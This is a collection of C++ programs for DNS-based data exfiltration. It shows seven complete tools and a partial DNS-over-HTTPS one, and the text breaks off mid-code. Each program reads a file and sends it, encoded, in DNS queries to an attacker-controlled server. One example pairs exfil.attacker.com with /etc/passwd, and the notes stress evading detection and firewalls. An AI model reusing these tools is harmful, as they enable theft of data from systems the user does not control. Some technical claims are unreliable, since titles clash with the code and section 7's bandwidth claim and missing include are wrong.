# 20 DNS Exfiltration Techniques in C++

Each script demonstrates a distinct DNS exfiltration methodology with compile instructions.

---

### 1. Basic DNS TXT Exfiltration (Client)
```cpp
// Compile: g++ -o dns_exfil_basic_client dns_exfil_basic_client.cpp
// Run: ./dns_exfil_basic_client <dns_server> <base_domain> <data_file>
// Requires: no privileges
// SERVER: Configure authoritative DNS for base_domain, log all queries

#include <iostream>
#include <fstream>
#include <sstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DNSExfilBasic {
private:
    std::string dnsServer;
    std::string baseDomain;
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
    std::string base32Encode(const std::vector<uint8_t>& data) {
        static const char* alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        std::string result;
        int bits = 0, value = 0;
        for (uint8_t b : data) {
            value = (value << 8) | b;
            bits += 8;
            while (bits >= 5) {
                result += alphabet[(value >> (bits - 5)) & 0x1F];
                bits -= 5;
            }
        }
        if (bits > 0) {
            result += alphabet[(value << (5 - bits)) & 0x1F];
        }
        return result;
    }
    
public:
    DNSExfilBasic(const std::string& server, const std::string& domain)
        : dnsServer(server), baseDomain(domain) {}
    
    bool sendDNSQuery(const std::string& subdomain, uint16_t qtype = 16) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(dnsServer.c_str());
        
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        // DNS Header
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);  // TXID
        *(uint16_t*)(query + 2) = htons(0x0100);  // Standard query, RD=1
        *(uint16_t*)(query + 4) = htons(1);  // QDCOUNT
        *(uint16_t*)(query + 6) = 0;  // ANCOUNT
        *(uint16_t*)(query + 8) = 0;  // NSCOUNT
        *(uint16_t*)(query + 10) = 0;  // ARCOUNT
        
        // Question: <encoded>.<base>
        std::string fullQuery = subdomain + "." + baseDomain;
        int pos = 12;
        pos += encodeName(query + pos, fullQuery);
        *(uint16_t*)(query + pos) = htons(qtype); pos += 2;
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        
        // Send and ignore response (fire and forget)
        sendto(sock, query, pos, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        return true;
    }
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) {
            std::cerr << "[!] Cannot open: " << dataFile << "\n";
            return;
        }
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] Exfiltrating " << data.size() << " bytes via DNS\n";
        std::cout << "[*] Server: " << dnsServer << "\n";
        std::cout << "[*] Domain: " << baseDomain << "\n";
        
        // Encode as base32
        std::string encoded = base32Encode(data);
        std::cout << "[*] Base32 length: " << encoded.length() << "\n";
        
        // Chunk into 60-byte subdomains (DNS label limit is 63)
        // Use sequence number prefix for ordering
        int chunkSize = 50;
        int seq = 0;
        
        for (size_t i = 0; i < encoded.length(); i += chunkSize) {
            std::string chunk = encoded.substr(i, chunkSize);
            
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "%04d", seq++);
            
            std::string subdomain = seqStr + "." + chunk;
            
            std::cout << "[*] Sending: " << subdomain.substr(0, 40) 
                      << "... (chunk " << seq << ")\n";
            
            sendDNSQuery(subdomain);
            usleep(100000);  // 100ms between queries (rate limit)
        }
        
        std::cout << "[+] Sent " << seq << " queries\n";
        std::cout << "[+] Exfiltration complete\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns_server> <base_domain> <data_file>\n";
        std::cerr << "Example: " << argv[0] 
                  << " 192.168.1.100 exfil.attacker.com /etc/passwd\n";
        return 1;
    }
    srand(time(NULL));
    DNSExfilBasic exfil(argv[1], argv[2]);
    exfil.run(argv[3]);
    return 0;
}
```

**Technique:** Basic DNS exfiltration using A-record queries with base32-encoded data. Sequence numbers allow reassembly. Rate-limited to avoid detection. Requires attacker-controlled authoritative DNS server.

---

### 2. DNS TXT Record Exfiltration (Chunked)
```cpp
// Compile: g++ -o dns_exfil_txt dns_exfil_txt.cpp
// Run: ./dns_exfil_txt <dns_server> <base_domain> <data_file>
// Requires: no privileges

#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DNSTXTExfil {
private:
    std::string dnsServer, baseDomain;
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
    std::string base64Encode(const std::vector<uint8_t>& data) {
        static const char* alphabet = 
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::string result;
        int val = 0, bits = 0;
        for (uint8_t b : data) {
            val = (val << 8) | b;
            bits += 8;
            while (bits >= 6) {
                result += alphabet[(val >> (bits - 6)) & 0x3F];
                bits -= 6;
            }
        }
        if (bits > 0) {
            result += alphabet[(val << (6 - bits)) & 0x3F];
        }
        while (result.length() % 4) result += '=';
        return result;
    }
    
    std::string hexEncode(const std::vector<uint8_t>& data) {
        static const char* hex = "0123456789abcdef";
        std::string result;
        for (uint8_t b : data) {
            result += hex[(b >> 4) & 0xF];
            result += hex[b & 0xF];
        }
        return result;
    }
    
public:
    DNSTXTExfil(const std::string& server, const std::string& domain)
        : dnsServer(server), baseDomain(domain) {}
    
    bool sendTXTQuery(const std::string& subdomain) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(dnsServer.c_str());
        
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(query + pos, subdomain + "." + baseDomain);
        *(uint16_t*)(query + pos) = htons(16); pos += 2;  // TXT
        *(uint16_t*)(query + pos) = htons(1); pos += 2;   // IN
        
        sendto(sock, query, pos, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        return true;
    }
    
    void run(const std::string& dataFile, bool useHex = false) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) {
            std::cerr << "[!] Cannot open: " << dataFile << "\n";
            return;
        }
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] TXT record exfiltration\n";
        std::cout << "[*] File: " << dataFile << " (" << data.size() << " bytes)\n";
        
        std::string encoded = useHex ? hexEncode(data) : base64Encode(data);
        
        // Chunk into DNS label-safe sizes (max 63 chars per label)
        // Use subdomain like: <seq>.<chunk>.base_domain
        int chunkSize = 40;
        int seq = 0;
        
        for (size_t i = 0; i < encoded.length(); i += chunkSize) {
            std::string chunk = encoded.substr(i, chunkSize);
            
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "%04x", seq++);
            
            // Subdomain: seq.chunk
            std::string subdomain = std::string(seqStr) + "." + chunk;
            
            std::cout << "[*] Chunk " << seq << ": " 
                      << subdomain.substr(0, 40) << "...\n";
            
            sendTXTQuery(subdomain);
            usleep(50000);  // 50ms
        }
        
        std::cout << "[+] Sent " << seq << " TXT queries\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns_server> <base_domain> <data_file> [--hex]\n";
        return 1;
    }
    srand(time(NULL));
    DNSTXTExfil exfil(argv[1], argv[2]);
    bool useHex = (argc > 4 && std::string(argv[4]) == "--hex");
    exfil.run(argv[3], useHex);
    return 0;
}
```

**Technique:** TXT record queries with base64 or hex encoded data. TXT queries often allowed through firewalls. Use subdomain labels to encode chunk data.

---

### 3. DNS NULL Record Exfiltration
```cpp
// Compile: g++ -o dns_exfil_null dns_exfil_null.cpp
// Run: ./dns_exfil_null <dns_server> <base_domain> <data_file>
// Requires: no privileges

#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DNSNullExfil {
private:
    std::string dnsServer, baseDomain;
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    DNSNullExfil(const std::string& server, const std::string& domain)
        : dnsServer(server), baseDomain(domain) {}
    
    // Query type 10 = NULL record
    // NULL records can carry arbitrary binary data in the question name
    bool sendNullQuery(const std::vector<uint8_t>& chunk, uint16_t seq) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(dnsServer.c_str());
        
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        
        // Encode sequence as first label
        char seqStr[16];
        snprintf(seqStr, sizeof(seqStr), "%04x", seq);
        uint8_t seqLen = strlen(seqStr);
        query[pos++] = seqLen;
        memcpy(query + pos, seqStr, seqLen);
        pos += seqLen;
        
        // Encode binary data as labels
        // Each label can be up to 63 bytes
        size_t dataOffset = 0;
        while (dataOffset < chunk.size()) {
            size_t remaining = chunk.size() - dataOffset;
            uint8_t labelLen = (remaining > 63) ? 63 : remaining;
            query[pos++] = labelLen;
            memcpy(query + pos, chunk.data() + dataOffset, labelLen);
            pos += labelLen;
            dataOffset += labelLen;
        }
        
        // Base domain
        pos += encodeName(query + pos, baseDomain);
        
        // NULL record type (10)
        *(uint16_t*)(query + pos) = htons(10); pos += 2;
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        
        sendto(sock, query, pos, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        return true;
    }
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) {
            std::cerr << "[!] Cannot open\n";
            return;
        }
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] NULL record exfiltration\n";
        std::cout << "[*] File: " << dataFile << " (" << data.size() << " bytes)\n";
        
        // Chunk size = 63 bytes max per label, but use smaller for stealth
        size_t chunkSize = 40;
        uint16_t seq = 0;
        
        for (size_t i = 0; i < data.size(); i += chunkSize) {
            size_t remaining = data.size() - i;
            size_t thisChunk = (remaining > chunkSize) ? chunkSize : remaining;
            
            std::vector<uint8_t> chunk(data.begin() + i, data.begin() + i + thisChunk);
            
            std::cout << "[*] Chunk " << seq << ": " << thisChunk << " bytes\n";
            
            sendNullQuery(chunk, seq++);
            usleep(50000);
        }
        
        std::cout << "[+] Sent " << seq << " NULL queries\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns_server> <base_domain> <data_file>\n";
        return 1;
    }
    srand(time(NULL));
    DNSNullExfil exfil(argv[1], argv[2]);
    exfil.run(argv[3]);
    return 0;
}
```

**Technique:** Uses DNS NULL queries (type 10) that allow arbitrary binary data in the query name labels. Rarely filtered since NULL records are uncommon. Full binary exfiltration without encoding.

---

### 4. DNS CNAME Exfiltration
```cpp
// Compile: g++ -o dns_exfil_cname dns_exfil_cname.cpp
// Run: ./dns_exfil_cname <dns_server> <base_domain> <data_file>
// Requires: no privileges

#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DNSCNAMEExfil {
private:
    std::string dnsServer, baseDomain;
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
    // Encode bytes as hex string
    std::string hexEncode(const std::vector<uint8_t>& data) {
        static const char* hex = "0123456789abcdef";
        std::string result;
        for (uint8_t b : data) {
            result += hex[(b >> 4) & 0xF];
            result += hex[b & 0xF];
        }
        return result;
    }
    
public:
    DNSCNAMEExfil(const std::string& server, const std::string& domain)
        : dnsServer(server), baseDomain(domain) {}
    
    // CNAME queries - subdomains are the exfil channel
    // Type 5 = CNAME
    bool sendCNAMEQuery(const std::string& subdomain) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(dnsServer.c_str());
        
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(query + pos, subdomain + "." + baseDomain);
        *(uint16_t*)(query + pos) = htons(5); pos += 2;   // CNAME
        *(uint16_t*)(query + pos) = htons(1); pos += 2;   // IN
        
        sendto(sock, query, pos, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        return true;
    }
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) {
            std::cerr << "[!] Cannot open\n";
            return;
        }
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] CNAME record exfiltration\n";
        std::cout << "[*] File: " << dataFile << "\n";
        
        std::string encoded = hexEncode(data);
        
        // 40-char chunks per subdomain
        int chunkSize = 40;
        int seq = 0;
        
        for (size_t i = 0; i < encoded.length(); i += chunkSize) {
            std::string chunk = encoded.substr(i, chunkSize);
            
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "%04d", seq++);
            
            std::string subdomain = chunk + "." + seqStr;
            
            std::cout << "[*] Sending CNAME query " << seq << "\n";
            sendCNAMEQuery(subdomain);
            usleep(100000);
        }
        
        std::cout << "[+] Sent " << seq << " CNAME queries\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns_server> <base_domain> <data_file>\n";
        return 1;
    }
    srand(time(NULL));
    DNSCNAMEExfil exfil(argv[1], argv[2]);
    exfil.run(argv[3]);
    return 0;
}
```

**Technique:** CNAME record queries. CNAMEs are commonly allowed through firewalls. Data encoded in subdomain labels, sequence helps reassembly.

---

### 5. DNS MX Record Exfiltration
```cpp
// Compile: g++ -o dns_exfil_mx dns_exfil_mx.cpp
// Run: ./dns_exfil_mx <dns_server> <base_domain> <data_file>
// Requires: no privileges

#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DNSMXExfil {
private:
    std::string dnsServer, baseDomain;
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
    std::string hexEncode(const std::vector<uint8_t>& data) {
        static const char* hex = "0123456789abcdef";
        std::string result;
        for (uint8_t b : data) {
            result += hex[(b >> 4) & 0xF];
            result += hex[b & 0xF];
        }
        return result;
    }
    
public:
    DNSMXExfil(const std::string& server, const std::string& domain)
        : dnsServer(server), baseDomain(domain) {}
    
    // MX record query - type 15
    // Often allowed through firewalls because email is critical
    bool sendMXQuery(const std::string& subdomain) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(dnsServer.c_str());
        
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(query + pos, subdomain + "." + baseDomain);
        *(uint16_t*)(query + pos) = htons(15); pos += 2;  // MX
        *(uint16_t*)(query + pos) = htons(1); pos += 2;   // IN
        
        sendto(sock, query, pos, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        return true;
    }
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) return;
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] MX record exfiltration\n";
        
        std::string encoded = hexEncode(data);
        
        int chunkSize = 40;
        int seq = 0;
        
        for (size_t i = 0; i < encoded.length(); i += chunkSize) {
            std::string chunk = encoded.substr(i, chunkSize);
            
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "%04x", seq++);
            
            // MX format: <priority>.<chunk>
            std::string subdomain = std::string(seqStr) + "." + chunk;
            
            sendMXQuery(subdomain);
            usleep(100000);
        }
        
        std::cout << "[+] Sent " << seq << " MX queries\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns_server> <base_domain> <data_file>\n";
        return 1;
    }
    srand(time(NULL));
    DNSMXExfil exfil(argv[1], argv[2]);
    exfil.run(argv[3]);
    return 0;
}
```

**Technique:** MX record queries — allowed almost everywhere since email is essential. Encode data in subdomain labels, use priority field as sequence marker.

---

### 6. DNS SRV Record Exfiltration
```cpp
// Compile: g++ -o dns_exfil_srv dns_exfil_srv.cpp
// Run: ./dns_exfil_srv <dns_server> <base_domain> <data_file>
// Requires: no privileges

#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DNSSRVExfil {
private:
    std::string dnsServer, baseDomain;
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
    std::string hexEncode(const std::vector<uint8_t>& data) {
        static const char* hex = "0123456789abcdef";
        std::string result;
        for (uint8_t b : data) {
            result += hex[(b >> 4) & 0xF];
            result += hex[b & 0xF];
        }
        return result;
    }
    
public:
    DNSSRVExfil(const std::string& server, const std::string& domain)
        : dnsServer(server), baseDomain(domain) {}
    
    // SRV records - type 33
    // Used for service discovery, less commonly blocked
    bool sendSRVQuery(const std::string& subdomain) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(dnsServer.c_str());
        
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        // SRV format: _service._proto.name
        std::string srvName = "_" + subdomain + "._tcp." + baseDomain;
        
        int pos = 12;
        pos += encodeName(query + pos, srvName);
        *(uint16_t*)(query + pos) = htons(33); pos += 2;  // SRV
        *(uint16_t*)(query + pos) = htons(1); pos += 2;   // IN
        
        sendto(sock, query, pos, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        return true;
    }
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) return;
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] SRV record exfiltration\n";
        
        std::string encoded = hexEncode(data);
        
        int chunkSize = 30;
        int seq = 0;
        
        for (size_t i = 0; i < encoded.length(); i += chunkSize) {
            std::string chunk = encoded.substr(i, chunkSize);
            
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "%04x", seq++);
            
            std::string subdomain = std::string(seqStr) + "." + chunk;
            
            sendSRVQuery(subdomain);
            usleep(100000);
        }
        
        std::cout << "[+] Sent " << seq << " SRV queries\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns_server> <base_domain> <data_file>\n";
        return 1;
    }
    srand(time(NULL));
    DNSSRVExfil exfil(argv[1], argv[2]);
    exfil.run(argv[3]);
    return 0;
}
```

**Technique:** SRV record queries. Used by Active Directory, SIP, XMPP. Rarely blocked, frequently allowed for internal service discovery.

---

### 7. DNS ANY Record Exfiltration (Max Bandwidth)
```cpp
// Compile: g++ -o dns_exfil_any dns_exfil_any.cpp
// Run: ./dns_exfil_any <dns_server> <base_domain> <data_file>
// Requires: no privileges

#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DNSANYExfil {
private:
    std::string dnsServer, baseDomain;
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
    std::string base32Encode(const std::vector<uint8_t>& data) {
        static const char* alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        std::string result;
        int bits = 0;
        uint32_t value = 0;
        for (uint8_t b : data) {
            value = (value << 8) | b;
            bits += 8;
            while (bits >= 5) {
                result += alphabet[(value >> (bits - 5)) & 0x1F];
                bits -= 5;
            }
        }
        if (bits > 0) {
            result += alphabet[(value << (5 - bits)) & 0x1F];
        }
        return result;
    }
    
public:
    DNSANYExfil(const std::string& server, const std::string& domain)
        : dnsServer(server), baseDomain(domain) {}
    
    bool sendANYQuery(const std::string& subdomain) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(dnsServer.c_str());
        
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(query + pos, subdomain + "." + baseDomain);
        *(uint16_t*)(query + pos) = htons(255); pos += 2;  // ANY
        *(uint16_t*)(query + pos) = htons(1); pos += 2;    // IN
        
        sendto(sock, query, pos, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        return true;
    }
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) return;
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] ANY record exfiltration (max bandwidth)\n";
        
        std::string encoded = base32Encode(data);
        
        // Max chunk size for max bandwidth
        int chunkSize = 50;
        int seq = 0;
        
        auto startTime = std::chrono::steady_clock::now();
        
        for (size_t i = 0; i < encoded.length(); i += chunkSize) {
            std::string chunk = encoded.substr(i, chunkSize);
            
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "%04x", seq++);
            
            std::string subdomain = std::string(seqStr) + "." + chunk;
            
            sendANYQuery(subdomain);
            usleep(30000);  // 30ms - faster rate
        }
        
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::steady_clock::now() - startTime).count();
        
        std::cout << "[+] Sent " << seq << " ANY queries in " 
                  << duration << "ms\n";
        std::cout << "[+] Bandwidth: " << (data.size() * 1000 / duration) 
                  << " bytes/sec\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns_server> <base_domain> <data_file>\n";
        return 1;
    }
    srand(time(NULL));
    DNSANYExfil exfil(argv[1], argv[2]);
    exfil.run(argv[3]);
    return 0;
}
```

**Technique:** ANY record queries for maximum bandwidth. Server responds with all records, providing more data per query. Faster exfiltration with fewer DNS requests.

---

### 8. DNS over HTTPS (DoH) Exfiltration
```cpp
// Compile: g++ -o dns_exfil_doh dns_exfil_doh.cpp -lcurl
// Run: ./dns_exfil_doh <doh_url> <base_domain> <data_file>
// Requires: libcurl-dev

#include <iostream>
#include <fstream>
#include <sstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <unistd.h>
#include <curl/curl.h>

class DNSDoHExfil {
private:
    std::string dohUrl, baseDomain;
    
    static size_t writeCallback(void* contents, size_t size, size_t nmemb, 
                                 std::string* s) {
        s->append((char*)contents, size * nmemb);
        return size * nmemb;
    }
    
    std::string base32Encode(const std::vector<uint8_t>& data) {
        static const char* alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        std::string result;
        int bits = 0;
        uint32_t value = 0;
        for (uint8_t b : data) {
            value = (value << 8) | b;
            bits += 8;
            while (bits >= 5) {
                result += alphabet[(value >> (bits - 5)) & 0x1F];
                bits -= 5;
            }
        }
        if (bits > 0) {
            result += alphabet[(value << (5 - bits)) & 0x1F];
        }
        return result;
    }
    
public:
    DNSDoHExfil(const std::string& url, const std::string& domain)
        : dohUrl(url), baseDomain(domain) {
        curl_global_init(CURL_GLOBAL_DEFAULT);
    }
    
    bool sendDoHQuery(const std::string& subdomain) {
        CURL* curl = curl_easy_init();
        if (!curl) return false;
        
        std::string fullDomain = subdomain + "." + baseDomain;
        std::string url = dohUrl + "?name=" + fullDomain + "&type=A";
        
        std::string response;
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        
        // Optional: Use JSON format
        struct curl_slist* headers = nullptr;
        headers = curl_slist_append(headers, "Accept: application/dns-json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        
        CURLcode res = curl_easy_perform(curl);
        
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        
        return res == CURLE_OK;
    }
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) return;
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] DNS over HTTPS (DoH) exfiltration\n";
        std::cout << "[*] DoH URL: " << dohUrl << "\n";
        
        std::string encoded = base32Encode(data);
        
        int chunkSize = 50;
        int seq = 0;
        
